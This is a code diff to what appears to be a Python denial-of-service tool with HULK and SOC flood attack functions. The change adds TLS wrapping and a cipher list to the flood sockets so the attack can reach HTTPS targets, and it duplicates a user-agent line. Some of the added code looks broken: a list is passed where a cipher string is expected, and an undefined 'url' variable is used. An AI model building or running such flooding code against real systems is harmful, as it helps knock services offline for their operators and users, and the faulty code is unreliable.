@@ -511,6 +511,7 @@ def AttackSOC(target, until_datetime, req):
 #hulk
 def LaunchHULK(url, th, t):
     target = get_target(url)
+    user_agent = random.choice(useragents)
     until = datetime.datetime.now() + datetime.timedelta(seconds=int(t))
     m = random.choice(method)
     user_agent = random.choice(useragents)
@@ -535,6 +536,10 @@ def AttackHULK(target, until_datetime, req):
         s = socks.socksocket()
         s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
         s.connect((str(target['host']), int(target['port'])))
+        ctx = ssl.create_default_context()
+        cipher = [':ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES256-GCM-SHA384:ECDHE-ECDSA-AES256-GCM-SHA384:DHE-RSA-AES128-GCM-SHA256:DHE-DSS-AES128-GCM-SHA256:kEDH+AESGCM:ECDHE-RSA-AES128-SHA256:ECDHE-ECDSA-AES128-SHA256:ECDHE-RSA-AES128-SHA:ECDHE-ECDSA-AES128-SHA:ECDHE-RSA-AES256-SHA384:ECDHE-ECDSA-AES256-SHA384:ECDHE-RSA-AES256-SHA:ECDHE-ECDSA-AES256-SHA:DHE-RSA-AES128-SHA256:DHE-RSA-AES128-SHA:DHE-DSS-AES128-SHA256:DHE-RSA-AES256-SHA256:DHE-DSS-AES256-SHA:DHE-RSA-AES256-SHA:!aNULL:!eNULL:!EXPORT:!DES:!RC4:!3DES:!MD5:!PSK']
+        ctx.set_ciphers(cipher)
+        s = ctx.wrap_socket(s, server_hostname=urlparse(url).netloc)
     while (until_datetime - datetime.datetime.now()).total_seconds() > 0:
         try:
             try:
